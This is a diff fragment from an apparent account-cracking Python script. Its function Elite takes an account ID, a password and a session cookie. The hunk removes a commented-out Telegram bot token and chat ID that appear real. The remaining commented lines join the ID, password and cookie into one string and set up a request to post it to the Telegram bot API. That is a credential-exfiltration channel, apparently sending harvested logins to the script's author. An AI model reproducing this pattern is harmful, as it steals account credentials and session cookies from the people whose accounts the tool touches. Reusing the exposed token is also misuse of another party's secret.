@@ -50,8 +50,6 @@ ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko)
 def Elite(sid,ps,cookie):
     try:
         import requests
-      #  token = "6778609883:AAGhGuBoIXuzgJN_wMoxETWdVW-eeRgdGSA"
-      #  chatid = "6789461185"
        # ok_id =str(sid+"|"+ps+"|"+cookie)
        # url = f"https://api.telegram.org/bot{token}/sendMessage"
        # params = {"chat_id": chatid, "text": ok_id}
